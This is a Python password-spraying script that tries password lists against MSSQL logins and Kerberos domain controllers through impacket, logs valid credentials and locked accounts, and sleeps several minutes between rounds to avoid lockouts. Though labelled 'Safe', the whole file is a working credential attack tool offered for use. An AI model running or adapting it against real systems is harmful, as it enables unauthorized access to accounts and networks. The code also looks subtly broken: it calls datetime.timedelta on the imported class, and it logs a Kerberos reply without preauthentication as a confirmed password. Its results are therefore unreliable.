import time
import random
import socket
import argparse
from datetime import datetime
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KDC_REQ_BODY, PrincipalName, seq_set, seq_set_iter
from impacket.krb5.types import KerberosTime, Principal
from pyasn1.codec.der.encoder import encode
from impacket.krb5.send import sendReceive
from impacket.krb5.types import getKerberosTGT
from impacket.krb5.crypto import _enctype_table
from impacket.smbconnection import SMBConnection
import pymssql
import sys

# === CONFIGURATION ===
KDC_IPS = ["10.0.0.1", "10.0.0.1"]
MSSQL_IP = "10.0.0.1"
MSSQL_PORT = 1433
OUTPUT_FILE = "spray_results.txt"

# === FUNCTIONS ===

def log(msg):
    timestamp = datetime.utcnow().isoformat()
    line = f"[{timestamp}] {msg}"
    print(line)
    with open(OUTPUT_FILE, "a") as f:
        f.write(line + "\n")

def kerberos_spray(username, password, domain, kdc_ip):
    try:
        user = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        as_req = AS_REQ()
        as_req['pvno'] = 5
        as_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
        req_body = KDC_REQ_BODY()
        req_body['kdc-options'] = constants.encodeFlags([
            "forwardable", "renewable", "proxiable"
        ])
        req_body['realm'] = domain.upper()
        server_name = Principal('krbtgt/' + domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        seq_set(req_body, 'sname', server_name.components_to_asn1)
        req_body['nonce'] = random.getrandbits(31)
        req_body['etype'] = [int(constants.EncryptionTypes.rc4_hmac.value)]
        now = datetime.utcnow()
        req_body['till'] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
        req_body['rtime'] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
        req_body['cname'] = user.components_to_asn1
        as_req['req-body'] = req_body
        message = encode(as_req)
        try:
            response = sendReceive(message, domain.upper(), kdc_ip)
            log(f"[KERBEROS] VALID: {domain}\\{username}:{password}")
        except Exception as e:
            if "KDC_ERR_PREAUTH_FAILED" in str(e):
                log(f"[KERBEROS] VALID USERNAME, BAD PASSWORD: {domain}\\{username}:{password}")
            elif "KDC_ERR_CLIENT_REVOKED" in str(e):
                log(f"[KERBEROS] ACCOUNT LOCKED: {domain}\\{username}")
            else:
                log(f"[KERBEROS] FAIL: {domain}\\{username}:{password} - {str(e)}")
    except Exception as e:
        log(f"[KERBEROS] ERROR on {domain}\\{username}: {str(e)}")

def mssql_spray(username, password):
    try:
        conn = pymssql.connect(server=MSSQL_IP, user=username, password=password, login_timeout=10, timeout=10)
        conn.close()
        log(f"[MSSQL] VALID: {username}:{password}")
    except pymssql.InterfaceError as e:
        log(f"[MSSQL] NO RESPONSE: {username}:{password} - {str(e)}")
    except pymssql.OperationalError as e:
        if "Login failed" in str(e):
            log(f"[MSSQL] INVALID: {username}:{password}")
        else:
            log(f"[MSSQL] ERROR: {username}:{password} - {str(e)}")
    except Exception as e:
        log(f"[MSSQL] UNEXPECTED ERROR: {username}:{password} - {str(e)}")

def random_delay(min_sec=300, max_sec=600):
    delay = random.randint(min_sec, max_sec)
    log(f"[DELAY] Sleeping for {delay // 60} minutes and {delay % 60} seconds...")
    time.sleep(delay)

# === MAIN ===

def main():
    parser = argparse.ArgumentParser(description="Safe MSSQL & Kerberos Password Spray Tool")
    parser.add_argument("-u", "--users", required=True, help="Path to usernames.txt")
    parser.add_argument("-p", "--passwords", required=True, help="Path to password list")
    parser.add_argument("-d", "--domain", required=True, help="Domain name for Kerberos spray")
    args = parser.parse_args()

    with open(args.users) as f:
        users = [line.strip() for line in f if line.strip()][:5]

    with open(args.passwords) as f:
        passwords = [line.strip() for line in f if line.strip()]

    for password in passwords:
        log(f"[START] Attempting password: '{password}'")

        for username in users:
            # MSSQL
            mssql_spray(username, password)

        for kdc in KDC_IPS:
            for username in users:
                kerberos_spray(username, password, args.domain, kdc)

        random_delay()

if __name__ == "__main__":
    main()
